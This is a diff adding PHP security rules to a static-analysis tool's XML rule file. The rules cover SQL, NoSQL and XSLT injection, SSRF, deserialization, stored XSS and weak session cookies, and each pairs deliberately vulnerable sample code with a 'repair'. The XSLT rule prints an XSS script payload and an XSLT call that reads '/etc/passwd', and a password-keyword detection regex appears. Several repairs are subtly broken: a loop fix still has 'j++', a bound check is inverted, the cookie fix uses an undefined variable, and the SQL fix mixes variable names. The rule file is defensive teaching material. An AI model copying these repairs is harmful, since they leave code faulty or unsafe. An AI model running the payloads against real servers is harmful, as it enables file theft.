+  // FIXED, either by casting to string, or proper encoding to avoid NoSQL injection
+  $username = json_encode( $_POST['username'] );
+
+  $qry = array(
+    "username" => $username,
+    "password" => (string) $_POST['password'] // FIXED, cast
+  );
+
+  $cursor = $collection->find($qry);
+  // ... do something with returned documents ...
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/943.html,https://www.infoq.com/articles/nosql-injections-analysis]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:943,OWASP-M:2016:M8,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:19]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, system_information, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.PasswordInRedirectRule" message="PasswordInRedirectRule: Password Management - Password in Redirect" class="com.optimyth.qaking.php.rules.security.PasswordInRedirectRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:13.1.3,ASVS-v4.0.2:3.1.1,CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[Sending a password as part of an HTTP redirect will cause the password to be displayed, logged, or stored in a cache.
+An HTTP redirect causes the user's web browser to issue an HTTP GET request. By convention, the parameters associated with an HTTP GET are not treated as sensitive data, 
+so web servers log them, proxies cache them, and web browsers do not make an effort to conceal them.
+Sending a password or other sensitive data as part of a redirect will likely cause the data to be mishandled and potentially revealed to an attacker.
+The rule checks if there are parts of the redirect chain that contain expressions that match with the pattern, so it can lead to several false positives and/or false negatives.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+    ...
+    if (!$loggedin) {
+        header('location: login.php?username='. $user . '&password='. $password); //VIOLATION
+    }
+
+?>]]></example>
+    <repair><![CDATA[]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/359.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:598,OWASP:2021:A7,PCI-DSS:6.5.3]]></security>
+    </normatives>
+    <properties>
+      <property name="passPattern" descname="Password key words pattern" value="\b(?:password|passwd|contrase..?a|senha|passwort|mot\s+de\s+passe)\b"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.PlaintextStorageInACookieRule" message="PlaintextStorageInACookieRule: Cleartext Storage of Sensitive Information in a Cookie" class="com.optimyth.qaking.php.rules.security.PlaintextStorageInACookieRule" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[Sensitive data stored in a encoded way makes harder to read it than it was stored in plaintext.
+        An attacker could use widely-available tools to view cookie content.
+        The rule checks whether a cookie with sensitive data is being stored without any kind of encoding.]]></description>
+    <priority>3</priority>
+    <effort>4</effort>
+    <vulntype>Misconfiguration</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Encoding data to be stored in a coookie improves security.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $secret = "IKnowWhoKilledKennedy";
+  setcookie("privateData", $secret); //VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+
+  function createSensitiveCookie($privateData) {
+    $value = crypto_secretbox($privateData, $once, $key); //FIXED
+    setcookie("privateData", $value);
+  }
+  
+  $secret = "IKnowWhoKilledKennedy";
+  createSensitiveCookie($secret);
+
+?>]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/312.html,https://www.owasp.org/index.php/Plaintext_Storage_in_Cookie,https://cwe.mitre.org/data/definitions/315.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:312,CWE:315]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.PlaintextStorageOfPassword" message="PlaintextStorageOfPassword: Plaintext Storage of a Password" class="com.optimyth.qaking.php.rules.security.PlaintextStorageOfPassword" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:2.10.3,ASVS-v4.0.2:2.7.5,CWEScope:Access-Control,credentials]]></tags>
+    <description><![CDATA[Storing a password in plaintext may result in a system compromise.
+
+Password management issues occur when a password is stored in plaintext in an application's properties or configuration file.
+Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource.]]></description>
+    <priority>3</priority>
+    <effort>3</effort>
+    <vulntype>Information leaks</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $config = parse_ini_file("config.php");
+  $password = $config["db"]["pass"];
+  $connect = mysql_connect( $server, $username, $password); // VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+  $config = parse_ini_file("config.php");
+  $passwordEnc = $config["db"]["passEnc"];
+  // FIXED - Use decryption function
+  $password = mcrypt_decrypt($cipher, $key, $passwordEnc, $mode);
+  $connect = mysql_connect( $server, $username, $password);
+?>]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/256.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:256,CWE:522,CWETOP25:2021:21,OWASP:2021:A4,PCI-DSS:6.3.1]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.PotentialInfiniteLoop" message="PotentialInfiniteLoop: Loop with Unreachable Exit Condition ('Infinite Loop')" class="com.optimyth.qaking.php.rules.security.PotentialInfiniteLoop" technology="PHP" active="true">
+    <tags><![CDATA[essential,potential-bug]]></tags>
+    <description><![CDATA[The program contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.
+Such infinite loop conditions are due typically to logical errors in the loop exit conditions and/or loop variables update,
+where the loop exit condition is never reached.
+
+An infinite loop will cause unexpected consumption of resources, such as CPU cycles or memory, and might compromise software availability.]]></description>
+    <priority>3</priority>
+    <effort>2</effort>
+    <vulntype>Control flow management</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+
+for($j = 0;$j < 10;j++){
+  for ($i = 1;$i < 10; $j++) { //VIOLATION
+    echo $i;
+  }
+}
+
+?>]]></example>
+    <repair><![CDATA[<?php
+
+for($j = 0;$j < 10;j++){
+  for ($i = 1;$i < 10; $i++) { //FIXED
+    echo $i;
+  }
+}
+
+?>]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/835.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:835,CWETOP25:2020:36]]></security>
+    </normatives>
+    <properties>
+      <property name="allowExplicitInfiniteLoops" descname="Intentional non-empty infinite loops, coded as while(true) ó for(;;), are allowed." value="false"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.TrustBoundaryViolationRule" message="TrustBoundaryViolationRule: Trust boundary violation" class="com.optimyth.qaking.php.rules.security.TrustBoundaryViolationRule" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Access-Control,trust-boundary]]></tags>
+    <description><![CDATA[The product mixes trusted and untrusted data in the same data structure or structured message.
+
+A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted.
+By combining trusted and untrusted data in the same data structure, it becomes easier for programmers
+to mistakenly trust unvalidated data. This violation may open attack avenues, like injection attacks,
+when the application takes untrusted data from the trusted domain without validation.
+
+When untrusted external input (e.g. input HTTP message contents) is set as session or web application attributes,
+without proper validation / neutralization, the check emits a violation.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid security issues when data passed to trusted domain is used without specific validation from other places
+in the application.]]></benefits>
+    <inconvenients><![CDATA[Need explicit input validation before data movement.]]></inconvenients>
+    <example><![CDATA[<?php 
+  $value = $_POST["value"];
+  $_SESSION["value"] = $value; //VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php 
+  $value = $_POST["value"];
+  preg_match("/(\d{4})-(\d{2})-(\d{2})/", $value, $results); //FIXED
+  
+  if(sizeof($results) > 0){
+    $_SESSION["value"] = $value; //OK
+  }
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/501.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:501,PCI-DSS:6.5.1]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.UncheckedInputInLoopCondition" message="UncheckedInputInLoopCondition: Unchecked input in loop condition" class="com.optimyth.qaking.php.rules.security.UncheckedInputInLoopCondition" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Availability]]></tags>
+    <description><![CDATA[Inputs used in loop conditions are not properly checked, potentially leading to a denial of service because of excessive looping.]]></description>
+    <priority>3</priority>
+    <effort>2</effort>
+    <vulntype>Control flow management</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php 
+  
+  $value = (int)$_POST["value"];
+  
+  for($x = 0; $x <= $value; $x++) { //VIOLATION
+    echo "The number is: $x <br>";
+  }
+  
+?>]]></example>
+    <repair><![CDATA[<?php 
+  
+  $value = (int)$_POST["value"];
+  
+  if($value > 50){ //FIXED
+    for($x = 0; $x <= $value; $x++) {
+      echo "The number is: $x <br>";
+    }
+  }
+  
+?>]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/606.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:606]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.UserControlledSQLPrimaryKey" message="UserControlledSQLPrimaryKey: Avoid using an user controlled Primary Key into a query." class="com.optimyth.qaking.php.rules.security.UserControlledSQLPrimaryKey" technology="PHP" active="true">
+    <description><![CDATA[The software constructs all or part of an SQL command using externally-controlled input, but it does not neutralize
+properly that input that could modify the intended SQL command when it is sent to a database interaction method.
+
+Commonly a database table contains information that should not be accessible to all the users. However, if an user can
+modify the query to specify a primary key, then it's possible for him to access unauthorized records.
+<br/>
+The rule detects a path in code between an user-input statement specifying the primary key (source) and a database call
+(sink), with SQL sentence depending on non neutralized input.
+
+It must be known that if SQL does not depend on user-controlled input (e.g. Parametrized SQL), there is no possibility
+for attacker to view unauthorized records.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Permissions, privileges and access controls</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoiding bypassing security authorizations avoids access to sensible information, improving security.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+
+  $id = $_POST["id"];
+
+  $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
+  // set the PDO error mode to exception
+  $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+  // prepare sql and bind parameters
+  $stmt = $conn->prepare("UPDATE MyGuests SET firstname = :firstname WHERE id = :id");
+  
+  $stmt->bindParam(':firstname', $firstname);
+  $stmt->bindParam(':id', $id); //VIOLATION
+  ...
+
+?>]]></example>
+    <repair><![CDATA[]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/566.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:566]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SEC.XsltInjection" message="XsltInjection: XML Injection (aka Blind XPath Injection)" class="com.optimyth.qaking.php.rules.security.XsltInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[If the software allows untrusted inputs to control part or all of an XSLT stylesheet,
+an attacker may change the structure and content of resulting XML.
+
+If the resulting XML ends in a browser, the attacker may choose contents to launch cross-site scripting
+attacks, or execute operations at server with victim's identity allowed by the browser's same-origin policy
+(a variantof the cross-site request forgery attack).
+
+The attacker may also use this flaw to launch attacks targeted at the server, like fetching content
+from arbitrary files, running arbitrary code, or executing OS commands, when certain XSLT functions
+are not disabled.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid XSLT Injection flaws allowing server-side and client-side attacks.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+
+  //Load the XML source
+  $xml = new DOMDocument;
+  $xml->load('collection.xml');
+  
+  $xslParam = $_POST["xsl"]; //source
+  
+  $xsl = new DOMDocument;
+  $xsl->load($xslParam); 
+  
+  //Configure the transformer
+  $proc = new XSLTProcessor;
+  $proc->registerPHPFunctions();
+  $proc->importStyleSheet($xsl); //VIOLATION
+  
+  echo $proc->transformToXML($xml);
+
+?>
+
+Attackers may use as attack vectors:
+* XSS payloads (run in browser rendering the transformation result):
+<xsl:template match="/">
+  <script>alert('You are XSSed')</script>
+</xsl:template>
+
+* Read arbitrary files from server:
+<xsl:template match="/">
+  <xsl:copy-of select="document('/etc/passwd')"/>
+</xsl:template>]]></example>
+    <repair><![CDATA[// Do not allow external input to select the XSLT stylesheet to use.
+// Instead, let the external input to choose between a fixed set of
+// allowed stylesheets provided by the software.]]></repair>
+    <reference><![CDATA[https://blog.csnc.ch/2015/06/xslt-security-and-server-side-request-forgery/]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:91,OWASP-M:2016:M8,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:20]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SerializationInjection" message="SerializationInjection: Deserialization of untrusted data" class="com.optimyth.qaking.php.rules.security.SerializationInjection" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:1.5.2,ASVS-v4.0.2:5.5.1,ASVS-v4.0.2:5.5.3,CWEScope:Availability,CWEScope:Integrity,serialization]]></tags>
+    <description><![CDATA[When application deserializes untrusted data (possibly chosen by an attacker), malformed data or unexpected data
+could be used to abuse application logic, deny service, or execute arbitrary code, when deserialized.
+
+The vulnerability occurs when user-supplied input is not properly sanitized before being passed to unserialize().
+Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call,
+resulting in an arbitrary PHP object(s) injection into the application scope.
+
+In order to successfully exploit a PHP Object Injection vulnerability, two conditions must be met:
+1) The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that
+   can be used to carry out malicious attacks.
+2) All of the classes used during the attack must be declared when the vulnerable unserialize() is being called,
+   or alternatively object autoloading must be supported for such classes.
+
+Properties written by a serialization attack could be private, which may cause unintended behaviour when the deserialized
+object is used. Additionally, classes with magic methods (__wakeup, __destruct, __toString, __call, __set or __get)
+are also targets of this attack, as their code could be executed automatically during deserialization.
+The chain of executed methods may end in the execution of a sensitive, unintended, operation.
+
+For complete technical detail of what an attacker may gain by exploiting this vulnerability, see
+"Utilizing Code Reuse/ROP in PHP Application Exploits", by S. Esser, BlackHat 2010.]]></description>
+    <priority>3</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $data = $_POST['data'];
+  $o = unserialize($data); // VIOLATION
+  // attacker may control fully the object properties, methods could behave unexpectedly
+  // but magic methods could be invoked anyway, like __wakeup()
+  $o->doSomething();
+?>]]></example>
+    <repair><![CDATA[<?php
+  // since PHP 7, options array with allowed_classes could be added as a mitigation
+  $options = ["allowed_classes" => ["MyClass1", "MyClass2"]];
+  $o = unserialize($data, $options); // FIXED
+  $o->doSomething();
+?>]]></repair>
+    <reference><![CDATA[https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf,https://www.owasp.org/index.php/PHP_Object_Injection]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:502,CWETOP25:2021:13,OWASP:2021:A8,PCI-DSS:6.5.1,WASC:20]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" value="*"/>
+      <property name="parametersAsSources" descname="If true, function parameters will be considered untrusted." value="false"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.ServerSideRequestForgery" message="ServerSideRequestForgery: Server-Side Request Forgery (SSRF)" class="com.optimyth.qaking.php.rules.security.ServerSideRequestForgery" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:12.6.1,ASVS-v4.0.2:5.2.6,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[A server side request forgery vulnerability appears when an attacker can send requests from a vulnerable server to remote services.
+
+SSRF attacks allow accessing, through the vulnerable server, to internal systems located behind a firewall,
+that normally should not be accessible.
+
+There are two kinds of SSRF attacks:
+- Trusted SSRF: we just can send requests to a list of predefined remote services.
+- Remote SSRF: we can send requests to any remote IP and port.
+
+SSRF attacks are commonly used for port scanning and attacking systems from the internal network.
+
+This rule checks if there are connections established using untrusted input data.]]></description>
+    <priority>1</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Prevent SSRF attacks.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  function ssrf_vulnerable() {
+    // Developer assumes that target_host is a hidden field, but not hidden at all for attackers!
+    $url = 'https://' . $_POST['target_host'] . '/path?';
+    $fullurl = $url . 'param=doSomething';
+    // VIOLATION, an attacker may choose host, port, and part of path
+    $data = file_get_contents($fullurl);
+  }
+?>]]></example>
+    <repair><![CDATA[// Avoid using untrusted input when composing URLs to connect to external services.
+// If needed, validate (in a white-list) the target services from a closed list of allowed endpoints.]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/918.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:918,CWETOP25:2021:24,OWASP:2021:A10,PCI-DSS:6.5.8]]></security>
+    </normatives>
+    <properties/>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SessionCookieConfiguration" message="SessionCookieConfiguration: Weak session cookies configuration" class="com.optimyth.qaking.php.rules.security.SessionCookieConfiguration" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:10.3.1,ASVS-v4.0.2:14.1.3,ASVS-v4.0.2:2.5.4,ASVS-v4.0.2:3.2.3,ASVS-v4.0.2:3.4.1,ASVS-v4.0.2:3.4.3,ASVS-v4.0.2:3.4.4,ASVS-v4.0.2:3.4.5,CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[Weak session cookies configuration can expose the application to session hijacking or session fixation attacks.
+
+Weaknesses analyzed in session configuration entries include:
+
+- Session IDs in URL instead of using cookies.
+  With session.use_trans_sid=1 or session.use_cookies=0, the session ID will not use cookies and will be written as
+  URL parameter, which could be captured from web logs and other sources.
+
+- Non strict mode.
+  With session.use_strict_mode=0, application may be vulnerable to session fixation attacks.
+
+- Cookies not sent over SSL (CWE-614):
+  Sending cookies over an unencrypted channel expose them to network sniffing attacks. The secure flag helps
+  with cookie confidentiality, very important for session ID cookies.
+
+- httpOnly not set:
+  Major browsers support the httpOnly flag, which prevents client-side (JavaScript) code from accessing the cookie.
+  Cross-site scripting (XSS) attacks often target cookies when they carry important information. Without httpOnly,
+  a XSS attack evades from browser's same-origin policy and let the attacker access to the session ID.
+
+- Too-broad domain:
+  Developers often set session cookie to be active across a base domain like ".myorg.com". This exposes the session ID
+  to all web applications on the base domain and subdomains. Shared cookies across apps may lead a vulnerability in one application
+  (where the session ID is captured by an attack) to compromise another.
+
+- Too-broad path:
+  Developers often set session cookie to be active across a base path like "/". This exposes the session ID
+  to all web applications on same domain. Shared cookies across apps may lead a vulnerability in one application to
+  compromise another.
+
+- Persistent cookies (CWE-539):
+  Developers may set expiration time for persistent cookies. Contrary to non-persistent cookies, which reside
+  in browser memory, persistent cookies are not lost when browser is closed. Attackers have a larger time window to impersonate
+  active sessions. Additionally, non-persistent cookies could be used for tracking user navigation, which could violate user privacy.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Misconfiguration</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid exposing sensitive data.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[; in php.ini configuration file:
+session.name=SESSIONID
+; VIOLATION, persistent cookie
+session.cookie_lifetime=123456
+; VIOLATION, transient SID (SID in URL)
+session.use_trans_sid=1
+; VIOLATION, no cookies for session ID is dangerous
+session.use_cookies=0
+; VIOLATION, non strict mode enables session fixation attacks
+session.use_strict_mode=0
+; VIOLATION, secure not set, session cookie sent in unprotected HTTP protocol
+session.cookie_secure=0
+; VIOLATION, httpOnly not set for session cookie
+session.cookie_httponly=0
+; VIOLATION, too-broad domain
+session.cookie_domain=.myorg.com
+; VIOLATION, too-broad path
+session.cookie_path=/]]></example>
+    <repair><![CDATA[; in php.ini configuration file:
+session.name=SESSIONID
+session.cookie_lifetime=0
+session.use_trans_sid=0
+session.use_cookies=1
+session.use_strict_mode=1
+session.cookie_secure=1
+session.cookie_httponly=1
+session.cookie_domain=www.myorg.com
+session.cookie_path=/myapp]]></repair>
+    <reference><![CDATA[https://cwe.mitre.org/data/definitions/16.html,http://php.net/session.configuration]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:16,CWE:539,CWE:614,OWASP:2021:A4,OWASP:2021:A5,PCI-DSS:6.5.10]]></security>
+    </normatives>
+    <properties>
+      <property name="checkSSL" descname="Check if cookies are sent over SSL." value="true"/>
+      <property name="checkPersistentCookies" descname="Check if cookies are persistent." value="true"/>
+      <property name="checkHTTPOnly" descname="Check if HTTPOnly flag is set." value="true"/>
+      <property name="checkBroadPath" descname="Check if cookies are accessible across too-broad application paths." value="true"/>
+      <property name="domainPattern" descname="Regular expression pattern for too-broad cookie domain." value="\.?(\w)+\.(\w)+"/>
+      <property name="checkBroadDomain" descname="Check if cookies are accessible across too-broad domains." value="true"/>
+      <property name="pathPattern" descname="Regular expression pattern for too-broad cookie path." value="/"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.SqlInjection" message="SqlInjection: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" class="com.optimyth.qaking.php.rules.security.SqlInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.3.4,ASVS-v4.0.2:5.3.5,CWEScope:Access-Control,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[The software constructs all or part of an SQL command using externally-controlled input, but it does not neutralize properly that input that could modify the intended SQL command when it is sent to a database interaction method.
+
+The rule detects a path in code between an input statement (source) and a database call (sink), with SQL sentence depending on non neutralized input.
+
+It must be known that if SQL does not depend on user-controlled input (e.g. Parametrized SQL, see repair example), there is no possibility for an SQL injection.
+
+Note: Using stored procedures in database operations does NOT prevent SQL injection if, for example, the SQL to send to the database for execution of the stored procedure is composed by concatenating non properly neutralized user input.
+The ways to avoid SQL injection are: 1) Use parametrized SQL, so SQL code and parameters are not mixed (no parameter could change semantics of the SQL).
+2) If SQL code must depend on user input (e.g. to build 'dynamic' WHERE clauses), even with prepared statements, all user-controlled inputs used to compose such "dynamic" SQL should be neutralized.
+
+A neutralization function either validates inputs and report an (neutral) error without allowing SQL execution, or replaces sensitive SQL characters in the input to avoid that the resulting SQL has different semantics.
+
+It is recommended to use parametrized SQL (when possible).]]></description>
+    <priority>1</priority>
+    <effort>4</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[$username = $_POST['username'];
+$pasword = $_POST['password'];
+$dhb = mysql_connect(...);
+// SQL INJECTION
+$query = "SELECT * FROM USERS WHERE USERNAME = '$username' AND PASSWORD = '$password'";
+$result = mysql_query($query, $dbh );]]></example>
+    <repair><![CDATA[Prevent injection by neutralizing the user-controlled input, and prepared statements / parameterized SQL (if possibly, apply both techniques).
+Please note that not all PHP database extensions support parameterized SQL (e.g. standard MySQL extension does not, and it is deprecated).
+Instead, use an extension that supports parameterized SQL, like MySQLi or PDO extensions.
+
+$username = $_POST['username'];
+$pasword = $_POST['password'];
+
+$dhb = mysql_connect(...);
+// FIXED, user-controlled input is neutralized
+// (but migrate to a safer, non deprecated DB extension and use parameterized SQL if possible)
+$query = sprintf(
+  "SELECT * FROM USERS WHERE USERNAME = '%s' AND PASSWORD = '%s'",
+  mysqli_real_escape_string($dhb, $username),
+  mysqli_real_escape_string($dhb, $password)
+);
+$result = mysql_query($query, $dbh );
+
+// FIXED, using PDO
+$dbh = new PDO(...); // database connection params
+$stmt = $dbh->prepare( 'SELECT * FROM USERS WHERE USERNAME = :username AND PASSWORD = :password' );
+$stmt->execute( array(':username' => $username, ':password' => $password) );
+$user = $stmt->fetch(PDO::FETCH_ASSOC);
+
+// If you really need that the user input controls parts of the SQL (e.g. in ordering, filtering criteria, etc.)
+// see http://php.net/manual/en/security.database.sql-injection.php for more techniques.
+// For example, if sorting column should be specified e.g. from a user-controlled combobox, a array mapping could avoid problems:
+// This technique for dynamic SQL parts is called 'whitelisting': user input control which SQL part is chosen, 
+// but it is not directly concatenated
+$orderByField = array('name', 'price', 'quantity'); 
+$key = array_search($_GET['sort'], $orderByField); // a value
+$query = 'SELECT * FROM catalog ORDER BY ' . $orderByField[$key]; // SQL is dynamic, but this is safe]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/89.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:89,CWETOP25:2021:6,OWASP:2021:A3,PCI-DSS:6.5.1,WASC:19]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.StoredCrossSiteScripting" message="StoredCrossSiteScripting: Improper neutralization of stored data during web content generation (Cross-site Scripting, XSS)" class="com.optimyth.qaking.php.rules.security.StoredCrossSiteScriptingRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.3.3,CWEScope:Access-Control,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[Software places user-controlled input in page content. An attacker could inject browser script code that is executed in the browser.
+The end-user is the attacked subject, and the software is the vehicle for the attack.
+
+This rule considers Stored XSS: An attacker provides malicious content to vulnerable application, which is stored somewhere.
+When other user access to vulnerable pages that embed without proper neutralization the attacker content, script code
+is executed in the victim's browser.
+
+The script executed in the victim's browser could perform malicious activities, like stealing active authentication tokens
+(sometimes in the form of cookies) and performing operations on a insecure webapp (on behalf of the victim) that trusts too much
+identity artifacts in browser and do not request additional authorization for operations ('Cross-Site Request Forgery attack', CSRF).
+
+Many browsers could limit the damage via security restrictions (e.g. 'same origin policy'), but browsers generally allow
+scripting languages (e.g. JavaScript) in their browsers (disabling JavaScript severely limits a web site).
+
+For remediation, you could perform data validation (to ensure that user input is valid), data sanitization
+(to remove HTML tags from user input), or output escaping (to remove characters from user input that could make the browser
+interpret any part of it as executable code).
+
+PHP provide many functions for this: preg_match() for matching user input against regular expressions, strip_tags()
+for removing HTML/PHP markup from user input, or htmlentities() / htmlspecialchars() for output escaping
+(escape HTML tag chars, like <, >, &, " or ', into HTML entities).
+Proper positive input validation, preferably of the white-list kind ("accept only known, neutral input"),
+plus output escaping (via htmlentities() / htmlspecialchars()) is more adequate against XSS.
+
+In particular, strip_tags() is considered flawed as XSS protection (e.g. injected onXYZ HTML attributes are not removed),
+and other alternatives should be used (see http://htmlpurifier.org/comparison#striptags).
+Of course, a markup removal could be followed by output escaping, which is the neutralization required by the rule.
+
+Remember that the attacker may encode special HTML / JavaScript characters in rather imaginative ways to escape any
+"reject bad characters" validation strategy.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  $con = mysql_connect($server,$user,$password);
+  $result = mysql_query("SELECT * FROM MYTABLE WHERE ID=" + $myid);
+  $row = mysql_fetch_array($result);
+  echo '<div class="header"> Welcome, ' . mysql_result($row, 0, 'username') . '</div>';  // VIOLATION
+?>]]></example>
+    <repair><![CDATA[<?php
+  $con = mysql_connect($server, $user, $password);
+  $result = mysql_query("SELECT * FROM MYTABLE WHERE ID=" + $myid);
+  $row = mysql_fetch_array($result);
+  // FIXED: escape before display
+  $username = htmlspecialchars( mysql_result($row, 0, 'username') );
+  echo '<div class="header"> Welcome, ' . $username . '</div>';
+?>]]></repair>
